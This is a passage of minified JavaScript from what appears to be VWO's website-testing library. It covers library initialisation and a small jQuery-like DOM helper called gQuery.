        _vis_opt_url: window._vis_opt_url,
        _vwo_cookieDomain: window._vwo_cookieDomain,
        _vis_opt_domain: window._vis_opt_domain,
        _vwo_style: window._vwo_style,
        _vwo_css: window._vwo_css,
        _vwo_uuid: window._vwo_uuid,
        _vis_apm_lib: window._vis_apm_lib,
        _vwo_api_section_callback: window._vwo_api_section_callback,
        _vis_heatmap: w,
        isInsightsOnConsentEnabled: !!window.vwo_cInstJS,
        document: {
          cookie: document.cookie,
          URL: document.URL,
          referrer: document.referrer,
          addEventListener: document.addEventListener,
          domain: document.domain,
          title: document.title,
          characterSet: document.characterSet,
          charset: document.charset,
          baseURI: document.baseURI
        }
      };
      window.fetcher.init(), window.fetcher.setValue("fakeWindow", _), bt(e), window._vwo_server_url = window._vwo_server_url || "https://dev.visualwebsiteoptimizer.com/", Ln({
        getters: {
          window: window,
          accountId: window._vwo_acc_id,
          encodeURIComponent: encodeURIComponent,
          actions: {},
          serverUrl: window._vwo_server_url || "https://dev.visualwebsiteoptimizer.com/"
        }
      });
      const g = new ("function" == typeof window.URL ? window.URL : window.webkitURL)(document.URL).searchParams.get("vwoLogLevel");
      c.setLevel(g || "warn"), c.info("Initializing jslib");
      const p = new On(window.VWO || []);
      if (S(p), T(p), Zn.init("jslib", p, null, null, !1), xt.setOptOutStateConfig(), Wt.syncThirdPartyGlobalCookies(), Re.domain = De.cookieDomain, window.VWO._.cLFE = Wt.isCookieLessModeEnabled(), !ke() && !window._vis_debug && (!xt.shouldExecuteLibOnBasisOfCurrentOptOutState() || Wt.isGloballyOptedOut())) return window._removeVwoGlobalStyle(), void window.VWO._.triggerEvent(Ke.OPT_OUT, !0);
      window._vwo_s = qn, window.VWO._.phoenixMT.trigger("vwo_init"), window.VWO._.phoenixMT.on(Ke.END_APPLY_CHANGES, () => {
        const e = window._vwo_code;
        e && e.removeLoaderAndOverlay && e.removeLoaderAndOverlay();
      }), window.VWO._.phoenixMT.on(Ke.END_APPLY_CHANGES, () => {
        window.VWO._.ncLib ? window.VWO._.ncLib.initNonCriticalLib() : window.VWO._.phoenixMT.on("vwo_InitNCLib", () => {
          window.VWO._.ncLib.initNonCriticalLib();
        });
      });
      ut(() => {
        pa(p, wa);
      }, window._vwo_code && ![702077, 704345, 690758, 685475, 680279, 695984, 710456].includes(window._vwo_acc_id));
    } catch (e) {
      window.vwo_libExecuted = !0, console.error(e);
    }
  }
  function ja(e, t, n, o) {
    O._ && O._.customError && window.VWO._.customError({
      msg: e,
      url: "gquery.js",
      lineno: t,
      colno: n,
      source: o
    });
  }
  window.VWO.modules.phoenixPlugins.events.predefinedEvents.PageLoadEvent = ee.secondary("VWO.modules.phoenixPlugins.events.predefinedEvents.PageLoadEvent", $a);
  const Ba = function () {
    var e = document,
      t = e.documentElement,
      n = [].slice,
      o = [].push,
      i = [].filter,
      r = e.createElement("div"),
      s = [].indexOf,
      a = [].splice,
      c = !1,
      d = !1,
      l = function () {
        try {
          return [].reverse.call(this);
        } catch (e) {
          if (c || window.VWO._.customError({
            msg: "Native [].reverse Fn is overridden and Native Constants = " + !window.DISABLE_NATIVE_CONSTANTS,
            url: "gQuery.ts",
            lineno: 31,
            colno: 24,
            source: "gQuery"
          }), c = !0, 710129 === window._vwo_acc_id) return []._reverse.call(this);
        }
      },
      u = function () {
        try {
          return [].map.apply(this, arguments);
        } catch (e) {
          d || window.VWO._.customError({
            msg: "Native [].map Fn is overridden and Native Constants = " + !window.DISABLE_NATIVE_CONSTANTS,
            url: "gQuery.ts",
            lineno: 31,
            colno: 24,
            source: "gQuery"
          }), d = !0;
        }
      },
      w = window,
      _ = /^data-(.+)/,
      g = /\S+/g,
      p = /^(\s|\u00A0)+|(\s|\u00A0)+$/g,
      h = {
        animationIterationCount: !0,
        columnCount: !0,
        flexGrow: !0,
        flexShrink: !0,
        fontWeight: !0,
        lineHeight: !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        widows: !0,
        zIndex: !0
      };
    function v(e) {
      var t,
        n,
        r,
        s,
        a,
        c = !window.DISABLE_NATIVE_CONSTANTS && (null === (a = null === (s = null === (r = null === (n = null === (t = window.VWO._) || void 0 === t ? void 0 : t.nativeConstants) || void 0 === n ? void 0 : n.get) || void 0 === r ? void 0 : r.call(n, "Array")) || void 0 === s ? void 0 : s.prototype) || void 0 === a ? void 0 : a.filter) || i;
      return e.multiple && e.options ? function (e, t, n, i) {
        for (var r = [], s = $(t), a = i, c = 0, d = e.length; c < d; c++) if (s) {
          var l = t(e[c]);
          l.length && o.apply(r, l);
        } else for (var u = e[c][t]; !(null == u || i && a(-1, u));) r.push(u), u = n ? u[t] : null;
        return r;
      }(c.call(e.options, function (e) {
        return e.selected && !e.disabled && !e.parentNode.disabled;
      }), "value") : e.value || "";
    }
    function f(e) {
      return (f = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    var E = {
        focus: "focusin",
        blur: "focusout"
      },
      m = /^(?:mouse|pointer|contextmenu|drag|drop|click|dblclick)/i;
    var O = /\S+/g;
    var S = {
      focus: {
        delegateType: "focusin"
      },
      blur: {
        delegateType: "focusout"
      },
      mouseenter: {
        delegateType: "mouseover",
        bindType: "mouseover"
      },
      mouseleave: {
        delegateType: "mouseout",
        bindType: "mouseout"
      },
      pointerenter: {
        delegateType: "pointerover",
        bindType: "pointerover"
      },
      pointerleave: {
        delegateType: "pointerout",
        bindType: "pointerout"
      }
    };
    Element.prototype.closest || (Element.prototype.closest = function (e) {
      var t = this;
      if (!document.documentElement.contains(t)) return null;
      do {
        if (C(t, e)) return t;
        t = t.parentElement || t.parentNode;
      } while (null !== t && 1 === t.nodeType);
      return null;
    });
    var T = function e(t, n) {
        return new e.fn.init(t, n);
      },
      C = T.matches = function (e, t) {
        var n = e && (e.matches || e.webkitMatchesSelector || e.mozMatchesSelector || e.msMatchesSelector || e.oMatchesSelector);
        return !!n && n.call(e, t);
      },
      y = T.isString = function (e) {
        return f(e) === f("");
      },
      I = /^--/;
    function A(e) {
      return I.test(e);
    }
    var N = /-([a-z])/g;
    function b(e, t) {
      return t.toUpperCase();
    }
    var V = T.camelCase = function (e) {
      return e.replace(N, b);
    };
    function R(e) {
      return !!e && 1 === e.nodeType;
    }
    var L = {},
      P = r.style,
      D = ["webkit", "moz", "ms", "o"];
    function x(e, t) {
      if (void 0 === t && (t = A(e)), t) return e;
      if (!L[e]) {
        var n = V(e),
          o = "" + n.charAt(0).toUpperCase() + n.slice(1);
        J((n + " " + D.join(o + " ") + o).split(" "), function (t, n) {
          if (n in P) return L[e] = n, !1;
        });
      }
      return L[e];
    }
    function U(e, t, n) {
      return void 0 === n && (n = A(e)), n || h[e] || !H(t) ? t : t + "px";
    }
    function k(e, t) {
      return parseInt(W(e, t), 10) || 0;
    }
    function W(e, t, n) {
      if (R(e) && t) {
        var o = w.getComputedStyle(e, null);
        return t ? n ? o.getPropertyValue(t) || void 0 : o[t] : o;
      }
    }
    var M,
      G = function () {},
      $ = T.isFunction = function (e) {
        return f(e) === f(G) && !!e.call;
      },
      F = T.uid = "_gQ" + Date.now(),
      j = function (e) {
        return e[F] = e[F] || {};
      },
      B = T.isWindow = function (e) {
        return e === e.window;
      },
      H = T.isNumeric = function (e) {
        return !isNaN(parseFloat(e)) && isFinite(e);
      },
      K = function (e) {
        return 9 === e.nodeType;
      };
    function J(e, t) {
      for (var n = 0, o = e.length; n < o && !1 !== t.call(e[n], n, e[n]); n++);
    }
    function Y(e, t, n) {
      J(e, function (e, o) {
        J(t, function (t, i) {
          q(o, e ? i.cloneNode(!0) : i, n, n && o.firstChild);
        });
      });
    }
    function q(e, t, n, o) {
      var i = [];
      if (J(3 === t.nodeType ? [] : T("script", t), function (e, t) {
        var n = document.createElement("script");
        J(T(t).prop("attributes"), function () {
          T(n).attr(this.name, this.value);
        }), n.text = t.innerHTML, i.push(n), t.parentElement.removeChild(t);
      }), n) {
        if ("SCRIPT" === t.tagName || "STYLE" === t.tagName) {
          var r = document.createElement(t.tagName.toLowerCase());
          "SCRIPT" === t.tagName ? r.text = t.innerHTML : r.appendChild(document.createTextNode(t.innerHTML)), J(T(t).prop("attributes"), function () {
            T(r).attr(this.name, this.value);
          }), r.classList = t.classList, e.insertBefore(r, o);
        } else e.insertBefore(t, o);
      } else if ("SCRIPT" === t.tagName || "STYLE" === t.tagName) {
        r = document.createElement(t.tagName.toLowerCase());
        "SCRIPT" === t.tagName ? r.text = t.innerHTML : r.appendChild(document.createTextNode(t.innerHTML));
        J(T(t).prop("attributes"), function () {
          T(r).attr(this.name, this.value);
        }), r.classList = t.classList, e.appendChild(r);
      } else e.appendChild(t);
      for (var s = 0; s < i.length; s++) document.getElementsByTagName("head")[0].appendChild(i[s]);
    }
    return T.extend = function () {
      var e,
        t,
        n,
        o,
        i = arguments[0] || {},
        r = 1,
        s = arguments.length,
        a = !1;
      for ("boolean" == typeof i && (a = i, i = arguments[1] || {}, r = 2), "object" === f(i) || $(i) || (i = {}), s === r && (i = this, --r); r < s; r++) if (null != (e = arguments[r])) for (t in e) if (n = i[t], o = e[t], "__proto__" !== t && i !== o) if (a && o && (T.isPlainObject(o) || T.isArray(o))) {
        var c = n && (T.isPlainObject(n) || T.isArray(n)) ? n : T.isArray(o) ? [] : {};
        i[t] = T.extend(a, c, o);
      } else void 0 !== o && (i[t] = o);
      return i;
    }, T.isArray = Array.isArray, T.isPlainObject = function (e) {
      if (!e || "[object Object]" !== Object.prototype.toString.call(e) || e.nodeType || e.setInterval) return !1;
      if (e.constructor && !hasOwnProperty.call(e, "constructor") && !hasOwnProperty.call(e.constructor.prototype, "isPrototypeOf")) return !1;
      var t;
      for (t in e);
      return void 0 === t || hasOwnProperty.call(e, t);
    }, T.parseJSON = function (e) {
      return "string" == typeof e && e ? /^[\],:{}\s]*$/.test(e.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, "")) ? JSON.parse(e) : void 0 : null;
    }, T.getJSON = function (e, t, n, o) {
      return $(t) && (o = o || n, n = t, t = null), T.ajax({
        url: e,
        data: t,
        success: n,
        dataType: o
      });
    }, T.get = function (e, t, n, o) {
      return $(t) && (o = o || n, n = t, t = null), T.ajax({
        type: "GET",
        url: e,
        data: t,
        success: n,
        dataType: o
      });
    }, T.each = function () {
      var e,
        t,
        o = arguments;
      1 === o.length && $(o[0]) ? (e = n.call(this), t = o[0]) : (e = o[0], t = o[1]);
      for (var i = 0; i < e.length; i++) t.call(e[i], i, e[i]);
      return this;
    }, T.ajax = function (e) {
      if ("script" === e.dataType) {
        var t = document.createElement("script");
        return t.src = e.url, document.getElementsByTagName("head")[0].appendChild(t), t.onload = e.success || G, void (t.onerror = e.error || G);
      }
      var n = new XMLHttpRequest();
      n.open(e.method ? e.method : "GET", e.url, !0), e.data || (e.data = null), n.onload = function () {
        this.status >= 200 && this.status < 400 && (e.dataType || (this.response = T.parseJSON(this.response)), e.success && e.success(this.response));
      }, n.onerror = function () {
        e.error && e.error(this.response);
      }, n.send(e.data);
    }, T.isEmptyObject = function (e) {
      return e && 0 === Object.keys(e).length;
    }, (T.fn = T.prototype = {
      gQVersion: "0.0.1",
      toArray: function () {
        return n.call(this, 0);
      },
      constructor: T,
      hasClass: function (e) {
        return n.call(this).every(function (t) {
          return 1 === t.nodeType && t.classList.contains(e);
        });
      },
      ready: function (t) {
        return "loading" !== e.readyState ? setTimeout(t) : e.addEventListener("DOMContentLoaded", t), this;
      },
      scrollTop: function () {
        var e = this[0];
        return B(e) ? e.pageYOffset : K(e) ? e.defaultView.pageYOffset : e.scrollTop;
      },
      scrollLeft: function () {
        var e = this[0];
        return B(e) ? e.pageXOffset : K(e) ? e.defaultView.pageXOffset : e.scrollLeft;
      },
      getComputedDimensionOuter: function (e, t) {
        let n = "height" === e.toLowerCase() ? 1 : 0,
          o = this[0];
        if (o) return B(o) ? window["outer" + e] : this[0]["offset" + e] + (t ? k(this[0], "margin" + (n ? "Top" : "Left")) + k(this[0], "margin" + (n ? "Bottom" : "Right")) : 0);
      },
      getComputedDimension: function (e, t) {
        var n,
          o,
          i = this[0],
          r = "height" === e.toLowerCase() ? 0 : 1;
        if (e = e.charAt(0).toUpperCase() + e.slice(1), K(i)) {
          var s = i.documentElement;
          return Math.max(i.body["scroll" + e], i.body["offset" + e], s["scroll" + e], s["offset" + e], s["client" + e]);
        }
        if (B(i)) return "height" === e.toLowerCase() ? i.outerHeight : i.outerWidth;
        try {
          return i.getBoundingClientRect()[e.toLowerCase()] - (k(n = i, "border" + ((o = r) ? "Left" : "Top") + "Width") + k(n, "padding" + (o ? "Left" : "Top")) + k(n, "padding" + (o ? "Right" : "Bottom")) + k(n, "border" + (o ? "Right" : "Bottom") + "Width"));
        } catch (e) {
          ja(`Error is ${e} and elem is ${i}`, 529, 25, "getBoundingClientRect");
        }
      },
      height: function () {
        return this.getComputedDimension("height");
      },
      width: function () {
        return this.getComputedDimension("width");
      },
      is: function (e) {
        if (!e) return !1;
        var t = !1;
        return this.each(function (n, o) {
          return !(t = "string" == typeof e ? C(o, e) : o === e);
        }), t;
      },
      attr: function (e, t) {
        var n;
        if (e) {
          if (y(e)) return void 0 === t ? null === (n = this[0] ? this[0].getAttribute ? this[0].getAttribute(e) : this[0][e] : void 0) ? void 0 : n : this.each(function (n, o) {
            o.setAttribute ? o.setAttribute(e, t) : o[e] = t;
          });
          for (var o in e) this.attr(o, e[o]);
          return this;
        }
      },
      removeAttr: function (e) {
        return e = e.match(g) || [], this.each(function (t, n) {
          J(e, function (e, t) {
            n.removeAttribute(t);
          });
        });
      },
      outerWidth: function (e) {
        return this.getComputedDimensionOuter("Width", e);
      },
      outerHeight: function (e) {
        return this.getComputedDimensionOuter("Height", e);
      },
      offset: function () {
        var e = this[0];
        if (e.nodeType == Node.TEXT_NODE && (e = e.parentElement), !e) return {
          top: 0,
          left: 0
        };
        let n = {};
        try {
          n = e.getBoundingClientRect();
        } catch (t) {
          if (ja(`Error is ${t} and elem is ${e}`, 603, 25, "getBoundingClientRect"), e === document) return;
        }
        var o = e.ownerDocument ? e.ownerDocument.defaultView : window;
        return {
          top: n.top + o.pageYOffset - t.clientTop,
          left: n.left + o.pageXOffset - t.clientLeft
        };
      },
      index: function (e) {
        var t = e ? T(e)[0] : this[0],
          n = e ? this : T(t).parent().children();
        return s.call(n, t);
      },
      each: T.each,
      delegate: function (e, t, n, o) {
        return this.on(e, t, n, o);
      },
      on: function (e, t, n, o) {
        var i,
          r,
          s = this;
        return $(t) && (n = t, t = null), this[0] === document && "ready" === e ? (this.ready(n), this) : (t && (i = n, n = function (e) {
          for (var n = e.target; !C(n, t);) {
            if (n === this || !n) return !1;
            n = n.parentNode;
          }
          n && i.call(n, e);
        }), J(y(r = e) && r.match(O) || [], function (i, r) {
          S[r] && (t && S[r].delegateType ? e = S[r].delegateType : S[r].bindType && (e = S[r].bindType)), s.each(function (t, i) {
            i.addEventListener(e, n, !!o);
          });
        }), this);
      },
      off: function (e, t, n) {
        return this.each(function (o, i) {
          i.removeEventListener(e, t, !!n);
        });
      },
      isChecked: function () {
        return null !== this[0].getAttribute("checked");
      },
      isFocussed: function () {
        return this[0] === e.activeElement;
      },
      closest: function (e) {
        return new T(this[0].closest(e));
      },
      parent: function () {
        return new T(this[0] && this[0].parentNode);
      },
      val: function (e) {
        if (!arguments.length) return this[0] && v(this[0]);
        const t = !window.DISABLE_NATIVE_CONSTANTS && window.VWO._.nativeConstants.get("Array").prototype.map || u;
        return this.each(function (n, o) {
          var i = o.multiple && o.options;
          if (i || /radio|checkbox/i.test(o.type)) {
            var r = Array.isArray(e) ? t.call(e, String) : null === e ? [] : [String(e)];
            i ? J(o.options, function (e, t) {
              t.selected = r.indexOf(t.value) >= 0;
            }) : o.checked = r.indexOf(o.value) >= 0;
          } else o.value = null == e ? "" : e;
        });
      },
      prop: function (e, t) {
        if (e) {
          if (y(e)) return void 0 === t ? this[0][e] : this.each(function (n, o) {
            o[e] = t;
          });
          for (var n in e) this.prop(n, e[n]);
          return this;
        }
      },
      data: function (e, t) {
        var n = this;
        if (!e) {
          if (!this[0]) return;
          var o = {};
          return J(this[0].attributes, function (e, t) {
            var i = t.name.match(_);
            i && (o[i[1]] = n.data(i[1]));
          }), o;
        }
        if (y(e)) return void 0 === t ? function (e, t) {
          var n = j(e)[t];
          return void 0 === n && (n = e.dataset ? e.dataset[t] : T(e).attr("data-" + t)), n;
        }(this[0], e) : this.each(function (n, o) {
          return function (e, t, n) {
            return j(e)[t] = n;
          }(o, e, t);
        });
        for (var i in e) this.data(i, e[i]);
        return this;
      },
      eq: function (e) {
        return T(this.get(e));
      },
      get: function (e) {
        return void 0 === e ? n.call(this) : e < 0 ? this[e + this.length] : this[e];
      },
      appendTo: function (e) {
        for (var t = T(e), n = 0; n < t.length; n++) t[n].appendChild(this[0]);
        return this;
      },
      find: function (e) {
        return this[0] || (e = void 0), T(e, this[0]);
      },
      toggleClass: function (e, t, n) {
        var o = [],
          i = void 0 !== t;
        return y(e) && (o = e.match(g) || []), this.each(function (e, r) {
          if (1 === r.nodeType) for (var s = 0; s < o.length; s++) i ? (n = t ? "add" : "remove", r.classList[n](o[s])) : r.classList.toggle(o[s]);
        });
      },
      addClass: function (e) {
        return this.toggleClass(e, !0, "add"), this;
      },
      removeClass: function (e) {
        return e ? this.toggleClass(e, !1, "remove") : this.attr("class", ""), this;
      },
      remove: function () {
        return this.each(function (e, t) {
          t.parentNode.removeChild(t);
        }), this;
      },
      children: function () {
        var e = [];
        return this.each(function (t, n) {
          o.apply(e, n.children);
        }), T(e);
      },
      map: function (e) {
        const t = !window.DISABLE_NATIVE_CONSTANTS && window.VWO._.nativeConstants.get("Array").prototype.map || [].map;
        return T(t.call(this, function (t, n) {
          return e.call(t, n, t);
        }));
      },
      clone: function () {
        return this.map(function (e, t) {
          return t.cloneNode(!0);
        });
      },
      filter: function (e) {
        var t,
          n,
          o,
          r,
          s,
          a = e;
        y(a) && (a = function (t, n) {
          return C(n, e);
        });
        const c = !window.DISABLE_NATIVE_CONSTANTS && (null === (s = null === (r = null === (o = null === (n = null === (t = window.VWO._) || void 0 === t ? void 0 : t.nativeConstants) || void 0 === n ? void 0 : n.get) || void 0 === o ? void 0 : o.call(n, "Array")) || void 0 === r ? void 0 : r.prototype) || void 0 === s ? void 0 : s.filter) || i;
        return T(c.call(this, function (e, t) {
          return a.call(e, t, e);
        }));
      },
      parents: function (e) {
        var t = [];
        return this.each(function (e, n) {
          for (var o = n.parentNode; o && 9 !== o.nodeType;) t.push(o), o = o.parentNode;
        }), t = t.filter(function (e, n) {
          return t.indexOf(e) === n;
        }), e && (t = t.filter(function (t) {
          return C(t, e);
        })), T(t);
      },
      append: function () {
        var e = this;
        return J(arguments, function (t, n) {
          Y(e, T(n));
        }), this;
      },
      prepend: function () {
        var e = this;
        return J(arguments, function (t, n) {
          Y(e, T(n), !0);
        }), this;
      },
      html: function (e) {
        return void 0 === e ? this[0] && this[0].innerHTML : this.each(function (t, n) {
          n.innerHTML = e;
        });
      },
      css: function (e, t) {
        if (y(e)) {
          var n = A(e);
          return e = x(e, n), arguments.length < 2 ? this[0] && W(this[0], e, n) : e ? (t = U(e, t, n), this.each(function (o, i) {
            R(i) && (n ? i.style.setProperty(e, t) : i.style[e] = t);
          })) : this;
        }
        for (var o in e) this.css(o, e[o]);
        return this;
      },
      hashchange: function (e) {
        window.addEventListener("hashchange", e);
      },
      replaceWith: function (e) {
        return this.each(function (t, n) {
          var o = n.nextSibling,
            i = n.parentNode;
          T(n).remove(), o ? T(o).before(e) : T(i).append(e);
        });
      },
      before: function () {
        var e = this;
        return J(arguments, function (t, n) {
          T(n).insertBefore(e);
        }), this;
      },
      after: function () {
        var e = this;
        const t = !window.DISABLE_NATIVE_CONSTANTS && window.VWO._.nativeConstants.get("Array").prototype.reverse || l;
        return J(t.apply(arguments), function (n, o) {
          t.apply(T(o).slice()).insertAfter(e);
        }), this;
      },
      insertBefore: function (e) {
        var t = this;
        return T(e).each(function (e, n) {
          var o = n.parentNode;
          o && t.each(function (t, i) {
            q(o, e ? i.cloneNode(!0) : i, !0, n);
          });
        }), this;
      },
      insertAfter: function (e) {
        var t = this;
        return T(e).each(function (e, n) {
          var o = n.parentNode;
          o && t.each(function (t, i) {
            q(o, e ? i.cloneNode(!0) : i, !0, n.nextSibling);
          });
        }), this;
      },
      trigger: function (t, n) {
        var o, i;
        if (y(t)) {
          var r = [(i = t.split("."))[0], i.slice(1).sort()],
            s = r[0],
            a = r[1],
            c = m.test(s) ? "MouseEvents" : "HTMLEvents";
          (o = e.createEvent(c)).initEvent(s, !0, !0), o.namespace = a.join(".");
        } else o = t;
        o.data = n;
        var d = o.type in E;
        return this.each(function (e, t) {
          d && $(t[o.type]) ? t[o.type]() : t.dispatchEvent(o);
        });
      },
      contents: function () {
        return this[0] ? T(this[0].childNodes) : T("");
      },
      not: function (e) {
        return T(this).filter(function (t, n) {
          return !C(n, e);
        });
      }
    }).bind = T.fn.live = T.fn.on, T.inArray = function (e, t) {
      return s.call(t, e);
    }, T.trim = function (e) {
      return (e || "").replace(p, "");
    }, T.getScript = function (e, t) {
      return T.get(e, void 0, t, "script");
    }, T.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error".split(" "), function (e, t) {
      T.fn[t] = function (e) {
        return "submit" === t ? this[0].submit() : e ? this.bind(t, e) : this.trigger(t);
      }, T.attrFn && (T.attrFn[t] = !0);
    }), T.guid = 1, T.proxy = function (e, t, n) {
      return 2 === arguments.length && ("string" == typeof t ? (e = (n = e)[t], t = void 0) : t && !$(t) && (n = t, t = void 0)), !t && e && (t = function () {
        return e.apply(n || this, arguments);
      }), e && (t.guid = e.guid = e.guid || t.guid || T.guid++), t;
    }, (T.fn.init = function (t, n) {
      var i,
        r = !1;
      if (y(t) && /<.+>/.test(t)) {
        r = !0;
        try {
          i = t, M || (M = e.implementation.createHTMLDocument(null)), M.body.innerHTML = i, t = M.body.childNodes;
        } catch (e) {
          throw e;
        }
      }
      if (!t) return this;
      if (t && t.nodeType || B(t)) return this[0] = t, this.length = 1, this;
      if (y(t)) {
        n = n || e;
        var s = this.constructor();
        try {
          var a = /^#[\w-]*$/.test(t) ? n.getElementById(t.slice(1)) : n.querySelectorAll(t);
          a && a.nodeType && (a = [a]), o.apply(s, r ? t : a);
        } catch (e) {}
        return s;
      }
      if ($(t)) return T.fn.ready(t);
      for (var c = 0; c < t.length; c++) this.length = t.length, this[c] = t[c];
    }).prototype = T.fn, T.fn.splice = a, "function" == typeof Symbol && (T.prototype[Symbol.iterator] = Array.prototype[Symbol.iterator]), T.prototype.slice = function () {
      return T(n.apply(this, arguments));
    }, T.prototype.length = 0, T.nodeName = function (e, t) {
      return e.nodeName && e.nodeName.toUpperCase() === t.toUpperCase();
    }, T;
  }();
  Fa(Ba);
})();